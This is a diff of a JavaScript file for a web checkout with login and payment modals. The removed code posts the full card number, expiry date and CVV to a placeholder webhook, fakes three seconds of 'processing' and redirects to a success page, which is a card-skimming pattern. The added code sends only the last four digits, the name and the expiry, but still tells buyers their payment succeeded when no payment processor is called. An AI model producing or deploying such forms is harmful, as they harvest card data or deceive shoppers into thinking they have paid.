@@ -1,112 +1,116 @@
-// Luhn algorithm for card validation
-function luhnCheck(cardNumber) {
-    const digits = cardNumber.replace(/\D/g, '');
+// Luhn Algorithm implementation
+function validateCardNumber(number) {
     let sum = 0;
     let isEven = false;
-
-    for (let i = digits.length - 1; i >= 0; i--) {
-        let digit = parseInt(digits[i]);
-
+    
+    // Remove any spaces or hyphens
+    number = number.replace(/\D/g, '');
+    
+    for (let i = number.length - 1; i >= 0; i--) {
+        let digit = parseInt(number.charAt(i));
+        
         if (isEven) {
             digit *= 2;
             if (digit > 9) {
                 digit -= 9;
             }
         }
-
+        
         sum += digit;
         isEven = !isEven;
     }
-
+    
     return sum % 10 === 0;
 }
 
-// Format card number with spaces
-function formatCardNumber(input) {
-    const value = input.value.replace(/\D/g, '');
-    input.value = value;
-}
+// Modal handling
+const loginModal = document.getElementById('loginModal');
+const paymentModal = document.getElementById('paymentModal');
+const loginBtn = document.getElementById('loginBtn');
 
-// Format expiry date
-function formatExpiryDate(input) {
-    let value = input.value.replace(/\D/g, '');
-    if (value.length >= 2) {
-        value = value.slice(0, 2) + '/' + value.slice(2);
+loginBtn.addEventListener('click', () => {
+    loginModal.style.display = 'flex';
+});
+
+// Close modals when clicking outside
+window.addEventListener('click', (e) => {
+    if (e.target === loginModal) {
+        loginModal.style.display = 'none';
     }
-    input.value = value;
-}
-
-// Show error message
-function showError(message) {
-    const errorElement = document.getElementById('errorMessage');
-    errorElement.textContent = message;
-    errorElement.classList.add('show');
-}
-
-// Hide error message
-function hideError() {
-    const errorElement = document.getElementById('errorMessage');
-    errorElement.classList.remove('show');
-}
-
-// Send payment data to webhook
-async function sendPaymentWebhook(data) {
-    const WEBHOOK_URL = 'YOUR_WEBHOOK_URL'; // Replace with your webhook URL
-    
-    const response = await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(data)
-    });
-
-    if (!response.ok) {
-        throw new Error('Payment verification failed');
-    }
-
-    return response;
-}
-
-// Form submission handler
-document.getElementById('paymentForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    hideError();
-
-    const cardNumber = document.getElementById('cardNumber').value;
-    const expiry = document.getElementById('expiry').value;
-    const cvv = document.getElementById('cvv').value;
-    const submitButton = document.getElementById('submitButton');
-
-    if (!luhnCheck(cardNumber)) {
-        showError('Invalid card number');
-        return;
-    }
-
-    submitButton.classList.add('loading');
-
-    try {
-        await sendPaymentWebhook({
-            cardNumber,
-            expiryDate: expiry,
-            cvv
-        });
-
-        // Simulate processing time
-        await new Promise(resolve => setTimeout(resolve, 3000));
-        
-        // Redirect to success page
-        window.location.href = '/success.html';
-    } catch (err) {
-        showError('Payment verification failed. Please try again.');
-    } finally {
-        submitButton.classList.remove('loading');
+    if (e.target === paymentModal) {
+        paymentModal.style.display = 'none';
     }
 });
 
-// Input formatting
-document.getElementById('cardNumber').addEventListener('input', (e) => formatCardNumber(e.target));
-document.getElementById('expiry').addEventListener('input', (e) => formatExpiryDate(e.target));
-document.getElementById('cvv').addEventListener('input', (e) => {
-    e.target.value = e.target.value.replace(/\D/g, '');
+// Handle package purchase
+function buyPackage(packageName, price) {
+    paymentModal.style.display = 'flex';
+    document.getElementById('packageInfo').innerHTML = `
+        <p>Package: ${packageName}</p>
+        <p>Price: $${price}</p>
+    `;
+}
+
+// Payment form handling
+const paymentForm = document.getElementById('paymentForm');
+paymentForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const cardNumber = document.getElementById('cardNumber').value;
+    const cardName = document.getElementById('cardName').value;
+    const expiry = document.getElementById('expiry').value;
+    const cvv = document.getElementById('cvv').value;
+    
+    // Validate card number using Luhn algorithm
+    if (!validateCardNumber(cardNumber)) {
+        alert('Invalid card number. Please check and try again.');
+        return;
+    }
+    
+    // Prepare payment data for webhook
+    const paymentData = {
+        cardName,
+        cardNumber: cardNumber.slice(-4), // Only send last 4 digits for security
+        expiry,
+        timestamp: new Date().toISOString()
+    };
+    
+    try {
+        // Send to webhook (replace URL with your actual webhook URL)
+        const response = await fetch('YOUR_WEBHOOK_URL', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(paymentData)
+        });
+        
+        if (response.ok) {
+            alert('Payment successful! Thank you for your purchase.');
+            paymentModal.style.display = 'none';
+            paymentForm.reset();
+        } else {
+            throw new Error('Payment failed');
+        }
+    } catch (error) {
+        alert('Payment processing failed. Please try again later.');
+        console.error('Payment error:', error);
+    }
+});
+
+// Format card expiry date
+const expiryInput = document.getElementById('expiry');
+expiryInput.addEventListener('input', (e) => {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length >= 2) {
+        value = value.slice(0, 2) + '/' + value.slice(2);
+    }
+    e.target.value = value;
+});
+
+// Format card number with spaces
+const cardNumberInput = document.getElementById('cardNumber');
+cardNumberInput.addEventListener('input', (e) => {
+    let value = e.target.value.replace(/\D/g, '');
+    e.target.value = value;
 });
